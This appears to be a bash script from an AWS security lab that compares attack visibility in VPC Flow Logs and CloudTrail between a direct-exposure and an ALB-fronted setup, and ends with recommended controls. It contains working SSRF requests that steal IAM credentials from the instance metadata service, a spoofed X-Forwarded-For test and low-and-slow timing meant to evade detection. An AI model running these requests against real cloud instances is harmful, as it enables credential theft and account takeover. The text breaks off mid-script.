#!/usr/bin/env bash
# =============================================================================
# 18_detection_evasion.sh — Detection & Visibility Analysis
# =============================================================================
# Purpose:
#   Analyze attack visibility differences between Config A and Config B.
#   Determine which configuration provides better forensic visibility
#   and detection capability through VPC Flow Logs and CloudWatch.
#
# Analysis areas:
#   1. Flow Log visibility per attack type
#   2. Source IP attribution (direct vs ALB-proxied)
#   3. IMDS access visibility (link-local behavior)
#   4. CloudTrail visibility for API-based attacks
#   5. Low-and-slow evasion technique analysis
#   6. Detection gap summary (Config A vs Config B)
#
# Key insight:
#   Config B (ALB) HIDES the attacker's true IP in Flow Logs.
#   Flow Logs only show ALB→EC2, not Client→ALB (for the app traffic).
#   Paradoxically, Config B may be HARDER to investigate forensically.
#
# Defenses:
#   - ALB access logs (capture true client IP in X-Forwarded-For)
#   - WAF logging (full request details)
#   - Application-level logging (log X-Forwarded-For)
#   - GuardDuty for anomalous API patterns
#   - CloudTrail for all AWS API calls
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "18: Detection & Visibility Analysis"

RESULT_FILE="18_detection_evasion.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Analyzing attack visibility across Config A and Config B${NC}"
echo ""

# =============================================================================
# Step 1: Flow Log Visibility Matrix
# =============================================================================
# Theoretical analysis based on architecture knowledge.
# VPC Flow Logs capture IP-layer traffic between ENIs in the VPC.
# They do NOT capture link-local (169.254.x.x) traffic.
# In Config B, ALB terminates the connection; Flow Logs only record ALB→EC2.
# =============================================================================
print_header "Step 1: Flow Log Visibility Matrix"

echo -e "${BLUE}[*] Analyzing what each attack type looks like in VPC Flow Logs${NC}"
echo -e "${BLUE}[*] This is a theoretical analysis based on known AWS networking behavior${NC}"
echo ""

result_text+="=== Step 1: Flow Log Visibility Matrix ==="$'\n'

echo -e "${BOLD}  ─────────────────────────────────────────────────────────────────────${NC}"
printf "  %-24s %-30s %-30s\n" "Attack Type" "Config A Flow Log" "Config B Flow Log"
echo -e "${BOLD}  ─────────────────────────────────────────────────────────────────────${NC}"

echo ""
printf "  %-24s\n" "Port Scan"
printf "    %-28s %-30s\n" "Flow Log entry:" "Attacker IP → EC2 IP"
printf "    %-28s %-30s\n" "" "ALB IP → EC2 IP  (attacker IP → ALB IP in separate log)"
printf "    %-28s %-30s\n" "Attacker visible:" "YES (direct)" "PARTIAL (requires ALB access logs)"
printf "    %-28s %-30s\n" "Detection rating:" "EASY" "MEDIUM"
echo ""

printf "  %-24s\n" "SSH Brute-force"
printf "    %-28s %-30s\n" "Flow Log entry:" "Attacker IP → EC2:22"
printf "    %-28s %-30s\n" "" "NOT VISIBLE (no SSH path exists)"
printf "    %-28s %-30s\n" "Attacker visible:" "YES (direct)" "N/A (attack eliminated)"
printf "    %-28s %-30s\n" "Detection rating:" "EASY" "N/A"
echo ""

printf "  %-24s\n" "HTTP Attack (SSRF)"
printf "    %-28s %-30s\n" "Flow Log entry:" "Attacker IP → EC2:80"
printf "    %-28s %-30s\n" "" "ALB IP → EC2:80  (attacker IP hidden)"
printf "    %-28s %-30s\n" "Attacker visible:" "YES (direct)" "NO (Flow Logs only)"
printf "    %-28s %-30s\n" "Detection rating:" "EASY" "HARD"
echo ""

printf "  %-24s\n" "IMDS Access (SSRF)"
printf "    %-28s %-30s\n" "Flow Log entry:" "NOT VISIBLE" "NOT VISIBLE"
printf "    %-28s %-30s\n" "Attacker visible:" "NO (link-local)" "NO (link-local)"
printf "    %-28s %-30s\n" "Detection rating:" "INVISIBLE" "INVISIBLE"
echo ""

printf "  %-24s\n" "RDS Access via SSRF"
printf "    %-28s %-30s\n" "Flow Log entry:" "EC2 IP → RDS:5432"
printf "    %-28s %-30s\n" "" "EC2 IP → RDS:5432  (same)"
printf "    %-28s %-30s\n" "Attacker visible:" "INDIRECT (EC2 is proxy)" "INDIRECT (EC2 is proxy)"
printf "    %-28s %-30s\n" "Detection rating:" "MEDIUM" "MEDIUM"
echo ""

printf "  %-24s\n" "Outbound C2"
printf "    %-28s %-30s\n" "Flow Log entry:" "EC2 IP → External:PORT"
printf "    %-28s %-30s\n" "" "NAT GW EIP → External:PORT"
printf "    %-28s %-30s\n" "Attacker visible:" "YES (EC2 IP direct)" "CONSOLIDATED (NAT GW EIP)"
printf "    %-28s %-30s\n" "Detection rating:" "MEDIUM" "EASY (single EIP to monitor)"
echo ""

printf "  %-24s\n" "AWS API Calls"
printf "    %-28s %-30s\n" "Flow Log entry:" "NOT IN FLOW LOGS" "NOT IN FLOW LOGS"
printf "    %-28s %-30s\n" "Attacker visible:" "CloudTrail only" "CloudTrail only"
printf "    %-28s %-30s\n" "Detection rating:" "MEDIUM" "MEDIUM"
echo ""

echo -e "${BOLD}  ─────────────────────────────────────────────────────────────────────${NC}"

result_text+="Port Scan:         Config A=EASY (Attacker IP→EC2 visible in Flow Logs)"$'\n'
result_text+="                   Config B=MEDIUM (ALB IP→EC2 in Flow Logs; need ALB logs for true client IP)"$'\n'
result_text+="SSH Brute-force:   Config A=EASY (Attacker IP→EC2:22 visible)"$'\n'
result_text+="                   Config B=N/A (no SSH path exists)"$'\n'
result_text+="HTTP/SSRF:         Config A=EASY (Attacker IP→EC2:80 visible)"$'\n'
result_text+="                   Config B=HARD (ALB IP→EC2:80 only; attacker IP hidden from Flow Logs)"$'\n'
result_text+="IMDS Access:       Config A=INVISIBLE (169.254.x.x is link-local, no Flow Log)"$'\n'
result_text+="                   Config B=INVISIBLE (same behavior)"$'\n'
result_text+="RDS via SSRF:      Config A=MEDIUM (EC2 IP→RDS visible)"$'\n'
result_text+="                   Config B=MEDIUM (same)"$'\n'
result_text+="Outbound C2:       Config A=MEDIUM (EC2 IP→external)"$'\n'
result_text+="                   Config B=EASY (NAT GW EIP consolidated; single IP to alert on)"$'\n'
result_text+="AWS API Calls:     Config A=MEDIUM (CloudTrail only)"$'\n'
result_text+="                   Config B=MEDIUM (CloudTrail only)"$'\n'

echo ""
echo -e "${BLUE}[*] Key architectural reason for Config B visibility gap:${NC}"
echo -e "  ALB terminates TCP connections. The client→ALB leg and the ALB→EC2 leg"
echo -e "  are two separate TCP flows. VPC Flow Logs record the ALB→EC2 flow,"
echo -e "  which only shows the ALB's private IP as the source — not the attacker's."
echo -e "  To recover the true client IP you must enable ALB access logs (S3) or"
echo -e "  attach a WAF, both of which are disabled by default."
echo ""

result_text+=$'\n'"Key insight: ALB terminates TCP. Flow Logs only show ALB private IP→EC2."$'\n'
result_text+="To recover real client IP: enable ALB access logs or WAF (off by default)."$'\n'

echo ""

# =============================================================================
# Step 2: Source IP Attribution Test
# =============================================================================
# Probe the application to see what client IP it reports and whether
# X-Forwarded-For headers are present. In Config A there is no XFF; the
# application sees the attacker IP directly. In Config B the ALB injects XFF
# with the true client IP, but that IP does NOT appear in Flow Logs.
# =============================================================================
print_header "Step 2: Source IP Attribution Test"

echo -e "${BLUE}[*] Testing client IP visibility from the application's perspective${NC}"
echo -e "${BLUE}[*] Checking for X-Forwarded-For header injection${NC}"
echo ""

result_text+=$'\n'"=== Step 2: Source IP Attribution Test ==="$'\n'

# --- 2a: Check /info endpoint for reported client IP ---
echo -e "${BLUE}[*] Test 2a: Querying /info endpoint for reported client IP${NC}"
info_response=$(curl -sS -m 10 "${TARGET_URL}/info" 2>/dev/null) || info_response=""

if [[ -n "${info_response}" ]]; then
    echo -e "  /info response (first 300 chars):"
    echo -e "  ${info_response:0:300}"
    result_text+="/info response: ${info_response:0:300}"$'\n'

    # Check if the app reports a client IP
    if echo "${info_response}" | grep -qi "client\|remote\|ip\|addr"; then
        echo -e "  ${YELLOW}Application appears to log client IP — check if it uses X-Forwarded-For${NC}"
        result_text+="Application reports client IP info"$'\n'
    fi
else
    echo -e "  ${YELLOW}/info endpoint not reachable or returned empty${NC}"
    result_text+="/info: Not reachable"$'\n'
fi

echo ""

# --- 2b: Check response headers for X-Forwarded-For ---
echo -e "${BLUE}[*] Test 2b: Inspecting response headers for proxy indicator headers${NC}"
headers=$(curl -sI -m 10 "${TARGET_URL}/" 2>/dev/null) || headers=""

if [[ -n "${headers}" ]]; then
    echo -e "  Response headers (first 500 chars):"
    echo -e "${headers:0:500}" | sed 's/^/    /'

    if echo "${headers}" | grep -qi "x-forwarded-for\|x-real-ip\|via\|x-amzn"; then
        echo -e "  ${RED}Proxy/ALB headers detected in response — Config B confirmed${NC}"
        result_text+="Proxy headers present: YES (ALB confirmed)"$'\n'
    elif echo "${headers}" | grep -qi "server\|content"; then
        echo -e "  ${YELLOW}No proxy headers in response — likely Config A (direct connection)${NC}"
        result_text+="Proxy headers present: NO (likely direct connection)"$'\n'
    fi
else
    echo -e "  ${YELLOW}Could not retrieve headers${NC}"
    result_text+="Headers: Could not retrieve"$'\n'
fi

echo ""

# --- 2c: Send a request with custom X-Forwarded-For and see if it is trusted ---
echo -e "${BLUE}[*] Test 2c: Spoofed X-Forwarded-For header test${NC}"
echo -e "  Sending request with X-Forwarded-For: 10.0.0.1 (spoofed internal IP)"
spoofed_resp=$(curl -sS -m 10 \
    -H "X-Forwarded-For: 10.0.0.1" \
    "${TARGET_URL}/info" 2>/dev/null) || spoofed_resp=""

if [[ -n "${spoofed_resp}" ]]; then
    echo -e "  Response: ${spoofed_resp:0:200}"
    result_text+="Spoofed XFF response: ${spoofed_resp:0:200}"$'\n'
    echo -e "  ${YELLOW}Note: If app trusts X-Forwarded-For without validation, IP attribution is spoofable${NC}"
else
    echo -e "  ${YELLOW}No response to spoofed XFF test${NC}"
    result_text+="Spoofed XFF: No response"$'\n'
fi

echo ""

# Attribution analysis
echo -e "${BOLD}  Source IP Attribution Summary:${NC}"
echo ""
if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "  ${RED}Config A (current): Attacker IP reaches EC2 directly${NC}"
    echo -e "    - Flow Logs record: Attacker IP → EC2 IP"
    echo -e "    - Application sees: Real attacker IP (no proxy)"
    echo -e "    - Forensic advantage: Easy IP attribution, simple incident response"
    echo -e "    - Forensic weakness: Attack surface is wide (direct exposure)"
    result_text+="Config A IP attribution: DIRECT — attacker IP visible in Flow Logs and application"$'\n'
else
    echo -e "  ${YELLOW}Config B (current): ALB proxies the connection${NC}"
    echo -e "    - Flow Logs record: ALB IP → EC2 IP (attacker IP NOT in Flow Logs)"
    echo -e "    - Application sees: ALB IP (unless it reads X-Forwarded-For)"
    echo -e "    - ALB access logs: Contain true client IP (must be enabled explicitly)"
    echo -e "    - Forensic advantage: Attack surface is reduced"
    echo -e "    - Forensic weakness: Default config hides attacker IP from Flow Logs"
    result_text+="Config B IP attribution: INDIRECT — Flow Logs show ALB IP; attacker IP requires ALB access logs"$'\n'
fi

echo ""

# =============================================================================
# Step 3: IMDS Access Visibility (Critical Gap)
# =============================================================================
# IMDS (169.254.169.254) is a link-local address (RFC 3927).
# Link-local traffic is processed by the hypervisor and never hits an ENI.
# Therefore VPC Flow Logs, Security Groups, and NACLs are ALL bypassed.
# There is zero network-level record of SSRF → IMDS credential theft.
# =============================================================================
print_header "Step 3: IMDS Access Visibility"

echo -e "${BLUE}[*] Demonstrating the critical visibility gap for IMDS access${NC}"
echo -e "${BLUE}[*] 169.254.169.254 is a link-local address — it bypasses all network logging${NC}"
echo ""

result_text+=$'\n'"=== Step 3: IMDS Access Visibility (Critical Gap) ==="$'\n'

echo -e "${RED}  CRITICAL: VPC Flow Logs do NOT record link-local (169.254.x.x) traffic${NC}"
echo -e "${RED}  This means IMDS credential theft is INVISIBLE at the network layer${NC}"
echo ""

# --- 3a: Trigger an IMDS access and explain the invisibility ---
echo -e "${BLUE}[*] Test 3a: Triggering IMDS access via SSRF${NC}"
echo -e "  URL: ${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/"
imds_resp=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>/dev/null) || imds_resp=""

if [[ -n "${imds_resp}" ]] && ! echo "${imds_resp}" | grep -qi "Token required\|401\|Unauthorized"; then
    echo -e "  ${RED}IMDS access succeeded — response: ${imds_resp:0:100}${NC}"
    echo -e "  ${RED}This access will NOT appear in VPC Flow Logs${NC}"
    echo -e "  ${RED}169.254.169.254 is link-local: no SG evaluation, no NACL, no Flow Log${NC}"
    result_text+="IMDS access via SSRF: SUCCEEDED"$'\n'
    result_text+="Flow Log visibility: NONE (link-local address bypasses all network logging)"$'\n'
    print_vulnerable "IMDS credential theft is INVISIBLE in VPC Flow Logs — highest severity detection gap"
else
    echo -e "  ${GREEN}IMDS access blocked (IMDSv2 enforced or IMDS unreachable)${NC}"
    echo -e "  Even so: if IMDSv1 were enabled, the theft would leave NO Flow Log trace"
    result_text+="IMDS access via SSRF: BLOCKED (IMDSv2 or unreachable)"$'\n'
    result_text+="Theoretical gap: IMDSv1 IMDS access would still be invisible in Flow Logs"$'\n'
    print_info "IMDS blocked — but the architectural visibility gap still applies with IMDSv1"
fi

echo ""

# --- 3b: Trigger credential path specifically ---
echo -e "${BLUE}[*] Test 3b: Triggering IAM credential path via SSRF${NC}"
iam_role=$(curl -sS -m 5 \
    "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" \
    2>/dev/null) || iam_role=""

if [[ -n "${iam_role}" ]] && ! echo "${iam_role}" | grep -qi "404\|not found\|Token required\|401\|<?xml"; then
    echo -e "  ${RED}IAM role name retrieved: ${iam_role}${NC}"
    echo -e "  ${RED}This credential discovery is INVISIBLE in VPC Flow Logs${NC}"
    result_text+="IAM role via IMDS: ${iam_role} (INVISIBLE in Flow Logs)"$'\n'
else
    echo -e "  ${YELLOW}IAM credentials path: ${iam_role:0:60} (blocked or no role)${NC}"
    result_text+="IAM credentials path: Blocked or no role attached"$'\n'
fi

echo ""

echo -e "${BLUE}[*] Technical explanation:${NC}"
echo -e "  169.254.169.254 is the APIPA / link-local address range (RFC 3927)"
echo -e "  AWS routes this to the Instance Metadata Service at the hypervisor level"
echo -e "  The packet never traverses an ENI — it is intercepted by the hypervisor"
echo -e "  Because there is no ENI transit, there is no Flow Log record"
echo -e "  Security Groups and NACLs are also bypassed for the same reason"
echo ""
echo -e "  ONLY these sources can detect IMDS access:"
echo -e "    1. Application-level logging (if the /fetch endpoint logs its requests)"
echo -e "    2. IMDSv2 enforcement (forces PUT token, blocks GET-based SSRF)"
echo -e "    3. AWS CloudTrail (records USE of stolen credentials after the fact)"
echo -e "    4. GuardDuty finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"
echo ""

result_text+="Detection sources for IMDS access (in order of effectiveness):"$'\n'
result_text+="  1. Application-level logging of /fetch requests"$'\n'
result_text+="  2. IMDSv2 enforcement (http_tokens=required)"$'\n'
result_text+="  3. CloudTrail (post-theft credential use)"$'\n'
result_text+="  4. GuardDuty InstanceCredentialExfiltration finding"$'\n'

echo ""

# =============================================================================
# Step 4: CloudTrail Visibility for Stolen Credentials
# =============================================================================
# When stolen IAM credentials are used to make AWS API calls, CloudTrail
# records the event. However, the source IP in CloudTrail is the EC2's
# outbound IP (Public IP in A, NAT GW EIP in B) — not the attacker's IP.
# The EC2 instance acts as an unwitting proxy for the attacker.
# =============================================================================
print_header "Step 4: CloudTrail Visibility for Stolen Credentials"

echo -e "${BLUE}[*] Analyzing what CloudTrail records when stolen credentials are used${NC}"
echo -e "${BLUE}[*] Key: CloudTrail source IP = EC2's outbound IP, NOT the attacker's IP${NC}"
echo ""

result_text+=$'\n'"=== Step 4: CloudTrail Visibility for Stolen Credentials ==="$'\n'

# --- 4a: Attempt to steal credentials (same pattern as scripts 11/15) ---
echo -e "${BLUE}[*] Test 4a: Attempting credential theft via SSRF → IMDS${NC}"

creds_json=""
cloudtrail_source_ip=""

if [[ -n "${iam_role:-}" ]] && ! echo "${iam_role:-}" | grep -qi "404\|error\|Token\|blocked"; then
    creds_json=$(curl -sS -m 10 \
        "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" \
        2>/dev/null) || creds_json=""
fi

if [[ -n "${creds_json}" ]] && echo "${creds_json}" | grep -qi "AccessKeyId"; then
    stolen_key=$(echo "${creds_json}" | python3 -c "
import json, sys
try:
    print(json.load(sys.stdin)['AccessKeyId'])
except:
    print('')
" 2>/dev/null || echo "")

    echo -e "  ${RED}Credentials obtained: AccessKeyId=${stolen_key}${NC}"
    result_text+="Credentials stolen: AccessKeyId=${stolen_key}"$'\n'

    # Determine outbound IP (what CloudTrail would record as source IP)
    echo ""
    echo -e "${BLUE}[*] Test 4b: Identifying outbound IP (CloudTrail source IP)${NC}"
    outbound_ip=$(curl -sS -m 8 \
        "${TARGET_URL}/fetch?url=https://checkip.amazonaws.com" \
        2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1) || outbound_ip=""

    cloudtrail_source_ip="${outbound_ip}"

    if [[ -n "${outbound_ip}" ]]; then
        echo -e "  ${YELLOW}EC2 outbound IP: ${outbound_ip}${NC}"
        echo -e "  ${YELLOW}CloudTrail would record source IP as: ${outbound_ip}${NC}"
        echo -e "  ${YELLOW}This is the EC2 IP, NOT the original attacker's IP${NC}"
        result_text+="CloudTrail source IP would be: ${outbound_ip} (EC2 outbound, not attacker)"$'\n'
    fi
else
    echo -e "  ${YELLOW}Could not obtain IAM credentials (IMDSv2 enforced or no role)${NC}"
    result_text+="Credentials: Not obtainable"$'\n'

    # Still identify what the CloudTrail source IP would be
    outbound_ip=$(curl -sS -m 8 \
        "${TARGET_URL}/fetch?url=https://checkip.amazonaws.com" \
        2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1) || outbound_ip=""
    cloudtrail_source_ip="${outbound_ip}"
    echo -e "  ${BLUE}EC2 outbound IP (theoretical CloudTrail source): ${outbound_ip:-unknown}${NC}"
    result_text+="Theoretical CloudTrail source IP: ${outbound_ip:-unknown}"$'\n'
fi

echo ""

# --- 4c: CloudTrail analysis ---
echo -e "${BLUE}[*] CloudTrail record analysis for credential-based attacks${NC}"
echo ""
echo -e "${BOLD}  What CloudTrail records:${NC}"
echo -e "    - EventName: e.g., GetCallerIdentity, DescribeInstances, s3:ListBuckets"
echo -e "    - EventTime: timestamp of the API call"
echo -e "    - SourceIPAddress: EC2's outbound IP (${cloudtrail_source_ip:-the EC2 Public/NAT GW IP})"
echo -e "    - UserAgent: the AWS CLI or SDK version used"
echo -e "    - UserIdentity.Arn: the role ARN being used"
echo ""
echo -e "${BOLD}  What CloudTrail does NOT record:${NC}"
echo -e "    - The original attacker's IP address"
echo -e "    - The SSRF payload that triggered the credential theft"
echo -e "    - The IMDS access that delivered the credentials"
echo ""
echo -e "${BOLD}  Config A vs Config B difference in CloudTrail:${NC}"
if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "    ${RED}Config A (current): SourceIPAddress = EC2 Public IP${NC}"
    echo -e "      Each EC2 has its own public IP — easier to correlate with a specific instance"
    echo -e "      But if multiple EC2s share the same role, attribution between instances is hard"
    result_text+="CloudTrail source IP attribution: Config A=per-EC2 Public IP (good instance attribution)"$'\n'
else
    echo -e "    ${YELLOW}Config B (current): SourceIPAddress = NAT GW EIP${NC}"
    echo -e "      ALL EC2s in the private subnet share the same NAT GW EIP"
    echo -e "      Cannot distinguish between legitimate EC2 activity and attacker-controlled calls"
    echo -e "      Makes CloudTrail investigation harder when multiple instances are involved"
    result_text+="CloudTrail source IP attribution: Config B=shared NAT GW EIP (harder cross-instance attribution)"$'\n'
fi

echo ""

result_text+="CloudTrail insight: Source IP = EC2 outbound IP, NOT attacker IP"$'\n'
result_text+="  Config A: Per-EC2 Public IP in CloudTrail (better instance attribution)"$'\n'
result_text+="  Config B: Shared NAT GW EIP in CloudTrail (harder to attribute to specific EC2)"$'\n'

echo ""

# =============================================================================
# Step 5: Low-and-Slow Evasion Techniques
# =============================================================================
# Rapid scanning is detectable via rate-based rules (WAF, GuardDuty).
# Low-and-slow attacks spread requests over time to stay below detection
# thresholds. This step demonstrates timing-based evasion and calculates
# whether the attack falls within typical Flow Log aggregation windows.
# =============================================================================
print_header "Step 5: Low-and-Slow Evasion Techniques"

echo -e "${BLUE}[*] Demonstrating how timing affects detectability${NC}"
echo -e "${BLUE}[*] VPC Flow Logs aggregate traffic in 60-second windows by default${NC}"
echo ""

result_text+=$'\n'"=== Step 5: Low-and-Slow Evasion Techniques ==="$'\n'

# --- 5a: Rapid-fire test (3 requests, no delay) ---
echo -e "${BLUE}[*] Test 5a: Rapid-fire — 3 SSRF requests with no delay${NC}"
rapid_start=$(date +%s)
rapid_success=0

for i in 1 2 3; do
    resp=$(curl -sS -m 5 \
        "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/instance-id" \
        2>/dev/null) || resp=""
    [[ -n "${resp}" ]] && ! echo "${resp}" | grep -qi "error\|Token required\|401" \
        && rapid_success=$(( rapid_success + 1 ))
done
rapid_end=$(date +%s)
rapid_elapsed=$(( rapid_end - rapid_start ))

echo -e "  Completed ${rapid_success}/3 requests in ${rapid_elapsed}s"
echo -e "  ${YELLOW}Rapid-fire is detectable by: WAF rate rules, GuardDuty HighVolumePortScan${NC}"
result_text+="Rapid-fire test: ${rapid_success}/3 requests in ${rapid_elapsed}s"$'\n'
result_text+="  Detection risk: HIGH (WAF rate rules, GuardDuty anomaly detection)"$'\n'

echo ""

# --- 5b: Low-and-slow test (3 requests with 5-second delays) ---
echo -e "${BLUE}[*] Test 5b: Low-and-slow — 3 SSRF requests with 5-second intervals${NC}"
echo -e "  ${YELLOW}(This will take ~10 seconds)${NC}"
slow_start=$(date +%s)
slow_success=0

for i in 1 2 3; do
    resp=$(curl -sS -m 5 \
        "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/ami-id" \
        2>/dev/null) || resp=""
    [[ -n "${resp}" ]] && ! echo "${resp}" | grep -qi "error\|Token required\|401" \
        && slow_success=$(( slow_success + 1 ))
    [[ $i -lt 3 ]] && sleep 5
done
slow_end=$(date +%s)
slow_elapsed=$(( slow_end - slow_start ))

echo -e "  Completed ${slow_success}/3 requests in ${slow_elapsed}s"
echo -e "  ${RED}Low-and-slow is harder to detect — requests appear as normal traffic${NC}"
result_text+="Low-and-slow test: ${slow_success}/3 requests in ${slow_elapsed}s"$'\n'
result_text+="  Detection risk: LOW (blends with normal application traffic)"$'\n'

echo ""

# --- 5c: Timing analysis ---
echo -e "${BLUE}[*] Timing analysis — full IMDS theft scenario${NC}"
echo ""
echo -e "  IMDS paths needed for full credential theft: ~5-7 requests"
echo -e "  At 1 request per 10 seconds: theft completes in ~60-70 seconds"
echo -e "  Flow Log aggregation window: 60 seconds (default)"
echo -e "  Requests per 60-second window: 6-7"
echo -e "  ${YELLOW}At this rate, each aggregation window contains only 6-7 Flow Log entries${NC}"
echo -e "  ${YELLOW}for SSRF→IMDS — well below typical anomaly thresholds${NC}"
echo ""
echo -e "  However: IMDS traffic (169.254.x.x) does NOT appear in Flow Logs at all"
echo -e "  So even rapid-fire IMDS access produces ZERO Flow Log entries"
echo -e "  ${RED}Rate limiting only applies to the initial HTTP hit on the /fetch endpoint${NC}"
echo ""

result_text+="Full IMDS theft timing analysis:"$'\n'
result_text+="  ~5-7 SSRF requests needed for full credential theft"$'\n'
result_text+="  At 1 req/10s: completes in 60-70 seconds (within 1 Flow Log window)"$'\n'
result_text+="  IMDS access itself produces ZERO Flow Log entries regardless of rate"$'\n'
result_text+="  Rate-limiting only applies to /fetch HTTP endpoint, not IMDS backend"$'\n'

echo ""

# =============================================================================
# Step 6: Detection Gap Summary
# =============================================================================
print_header "Step 6: Detection Capability Comparison"

result_text+=$'\n'"=== Step 6: Detection Gap Summary ==="$'\n'

echo -e "${BOLD}  ═══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  Detection Capability Comparison (Config A vs Config B)${NC}"
echo -e "${BOLD}  ═══════════════════════════════════════════════════════════════════════${NC}"
echo ""
printf "  %-22s %-24s %-24s %-8s\n" "Attack Type" "Config A Detection" "Config B Detection" "Winner"
echo -e "  ───────────────────────────────────────────────────────────────────────"
printf "  %-22s ${RED}%-24s${NC} ${YELLOW}%-24s${NC} %-8s\n" \
    "Port Scan" "EASY (direct IP)" "EASY (ALB access logs)" "TIE"
printf "  %-22s ${RED}%-24s${NC} ${GREEN}%-24s${NC} %-8s\n" \
    "SSH Brute-force" "EASY (Flow Logs)" "N/A (no SSH path)" "B (eliminated)"
printf "  %-22s ${RED}%-24s${NC} ${RED}%-24s${NC} %-8s\n" \
    "HTTP/SSRF" "EASY (direct IP)" "HARD (ALB hides IP)" "A"
printf "  %-22s ${RED}%-24s${NC} ${RED}%-24s${NC} %-8s\n" \
    "IMDS Theft" "INVISIBLE" "INVISIBLE" "TIE"
printf "  %-22s ${YELLOW}%-24s${NC} ${YELLOW}%-24s${NC} %-8s\n" \
    "DB Access (SSRF)" "MEDIUM (Flow Logs)" "MEDIUM (Flow Logs)" "TIE"
printf "  %-22s ${YELLOW}%-24s${NC} ${GREEN}%-24s${NC} %-8s\n" \
    "Outbound C2" "MEDIUM (direct)" "EASY (NAT GW consol.)" "B"
printf "  %-22s ${YELLOW}%-24s${NC} ${YELLOW}%-24s${NC} %-8s\n" \
    "AWS API Abuse" "CloudTrail only" "CloudTrail only" "TIE"
echo -e "  ───────────────────────────────────────────────────────────────────────"
echo ""

result_text+="Detection comparison table:"$'\n'
result_text+="  Port Scan:        A=EASY,    B=EASY       → TIE"$'\n'
result_text+="  SSH Brute-force:  A=EASY,    B=N/A        → B wins (attack eliminated)"$'\n'
result_text+="  HTTP/SSRF:        A=EASY,    B=HARD       → A wins"$'\n'
result_text+="  IMDS Theft:       A=INVISIBLE, B=INVISIBLE → TIE (worst case)"$'\n'
result_text+="  DB Access:        A=MEDIUM,  B=MEDIUM     → TIE"$'\n'
result_text+="  Outbound C2:      A=MEDIUM,  B=EASY       → B wins"$'\n'
result_text+="  AWS API Abuse:    A=MEDIUM,  B=MEDIUM     → TIE"$'\n'

echo -e "${BOLD}  Key Findings:${NC}"
echo ""
echo -e "  1. ${RED}Config B ELIMINATES SSH attacks but HIDES HTTP attacker IPs in Flow Logs${NC}"
echo -e "     Net detection capability is roughly equivalent — just different trade-offs."
echo ""
echo -e "  2. ${RED}IMDS theft is INVISIBLE in BOTH configurations${NC}"
echo -e "     The most dangerous attack (credential theft) has no network-level trace."
echo -e "     This is the highest-severity detection gap in the entire lab."
echo ""
echo -e "  3. ${YELLOW}Config B creates a false sense of security around HTTP attack attribution${NC}"
echo -e "     Flow Logs look clean (ALB IP → EC2) but the real attacker IP is missing."
echo -e "     Without ALB access logs enabled, incident response is severely hampered."
echo ""
echo -e "  4. ${GREEN}Config B improves Outbound C2 detection via NAT GW IP consolidation${NC}"
echo -e "     Single EIP to monitor/alert on vs per-instance IPs in Config A."
echo ""
echo -e "  5. ${CYAN}CloudTrail is equally effective in both configurations${NC}"
echo -e "     API abuse is detectable in both; the source IP attribution differs"
echo -e "     (per-EC2 Public IP in A, shared NAT GW EIP in B)."
echo ""

result_text+=$'\n'"Key Findings:"$'\n'
result_text+="1. Config B eliminates SSH but hides HTTP attacker IPs — net detection roughly equal"$'\n'
result_text+="2. IMDS theft is INVISIBLE in both configs — highest severity gap"$'\n'
result_text+="3. Config B creates false security: Flow Logs look clean but attacker IP missing"$'\n'
result_text+="4. Config B improves C2 detection via NAT GW IP consolidation"$'\n'
result_text+="5. CloudTrail equally effective in both; source IP attribution differs slightly"$'\n'

echo -e "${BOLD}  Recommended Additional Controls:${NC}"
echo ""
echo -e "  1. ${CYAN}Enable ALB access logs${NC} (Config B is incomplete without them)"
echo -e "     -> Logs true client IP, request path, response code, latency to S3"
echo ""
echo -e "  2. ${CYAN}Enforce IMDSv2 (http_tokens = required)${NC}"
echo -e "     -> Eliminates the INVISIBLE detection gap for IMDS theft"
echo ""
echo -e "  3. ${CYAN}Enable GuardDuty${NC}"
echo -e "     -> Detects InstanceCredentialExfiltration, DenialOfService, PortProbe"
echo ""
echo -e "  4. ${CYAN}Enable WAF with managed rules${NC}"
echo -e "     -> SSRF patterns, SQL injection, rate-based rules — all with request logging"
echo ""
echo -e "  5. ${CYAN}Application-level logging${NC}"
echo -e "     -> Log all /fetch requests including destination URL and response code"
echo -e "     -> The ONLY way to detect IMDS access in real time"
echo ""
echo -e "  6. ${CYAN}CloudTrail with CloudWatch alarms${NC}"
echo -e "     -> Alert on: sts:GetCallerIdentity from unexpected IPs"
echo -e "     -> Alert on: secretsmanager:ListSecrets, iam:ListRoles"
echo ""

result_text+=$'\n'"Recommended additional controls:"$'\n'
result_text+="1. Enable ALB access logs (critical for Config B forensics)"$'\n'
result_text+="2. Enforce IMDSv2 (closes IMDS visibility gap)"$'\n'
result_text+="3. Enable GuardDuty (InstanceCredentialExfiltration, PortProbe)"$'\n'
result_text+="4. Enable WAF with request logging"$'\n'
result_text+="5. Application-level logging of all /fetch requests"$'\n'
result_text+="6. CloudTrail alarms on sensitive API calls"$'\n'

# --- Overall verdict ---
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  Detection Visibility Verdict (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Count detection gaps (attack types rated HARD or INVISIBLE)
detection_gaps=0

